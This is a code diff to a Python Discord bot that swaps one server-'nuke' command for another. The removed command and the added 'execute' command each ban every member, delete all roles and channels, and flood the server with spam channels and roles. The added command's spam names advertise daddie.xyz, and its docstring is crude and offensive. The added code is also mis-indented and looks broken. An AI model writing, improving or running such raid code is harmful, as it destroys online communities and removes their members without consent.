@@ -403,38 +403,87 @@ async def punch(ctx, recipients):
         em = discord.Embed(description=Ioxide.user.name+' _**punched**_ '+recipients+' _**lights out**_ ', color= discord.Color(0x000000))
         em.set_image(url="https://tenor.com/view/luffy-punch-gif-5394144")
     await ctx.send(embed=em) 
-@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
-async def nuke(ctx):
-    await ctx.message.delete()
-    for user in list(ctx.guild.members):
-        try:
-            await user.ban()
-        except:
-            pass
-    for channel in list(ctx.guild.channels):
-        try:
-            await channel.delete()
-        except:
-            pass
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-        except:
-            pass
-    try:
-        await ctx.guild.edit(
-            name="FlashW",
-            description="We are your gods",
-            reason="LOL",
-            icon=none,
-            banner=none
+
+@Ioxide.command()
+    async def execute(self, ctx):
+        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
+        await ctx.message.delete()
+
+        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Started role DELETION")
+        roles = ctx.guild.roles
+        roles.pop(0)
+        for role in roles:
+            if ctx.guild.roles[-1] > role:
+                try:
+                    await role.delete()
+                    print(f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Deleted {role}")
+                except:
+                    print(
+                        f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete role: {role}"
+                    )
+            else:
+                await ctx.send("There was an error while deleting the roles.")
+
+        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")
+
+        for i in range(1, 50):
+            try:
+                await ctx.guild.create_role(
+                    name=f"NUKED BY RAGE https://daddie.xyz {i}"
+                )
+                print(
+                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY RAGE https://daddie.xyz {i}"
+                )
+            except Exception as e:
+                print(f"Error while makign role.\n\nError: {e}")
+        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT
+        for channel in ctx.guild.channels:
+            try:
+                await channel.delete()
+                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
+            except:
+                print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Failed to delete {channel}")
+
+                print(
+            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
         )
-    except:
-        pass
-    for _i in range(300):
-        await ctx.guild.create_text_channel(name="Flash Runs This son")
-    for _i in range(300):
-        await ctx.guild.create_role(name="Speed", color=RandomColor())
+        
+        for member in ctx.guild.members:
+            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
+            try:
+                await member.ban()
+                print(
+                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
+                )
+            except:
+                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")
+
+        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
+        # delete all channels so we can flood that shit lmfao
+
+        for i in range(1, 25):
+            try:
+                await ctx.guild.create_text_channel(
+                    name=f"NUKED-BY-RAGE-{i}-https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-RAGE-{i}-https://daddie.xyz"
+                )
+                await ctx.guild.create_voice_channel(
+                    name=f"NUKED BY RAGE {i} https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY RAGE {i} https://daddie.xyz"
+                )
+                await ctx.guild.create_category(
+                    name=f"NUKED BY RAGE {i} https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY RAGE {i} https://daddie.xyz"
+                )
+            except Exception as e:
+                print(f"Error while making channels\nError: {e}")
+        print(f"{Fore.RED}[-]NUKE > {Fore.RESET}Nuking finished!")
 
 if __name__ == '__main__':
     Init()
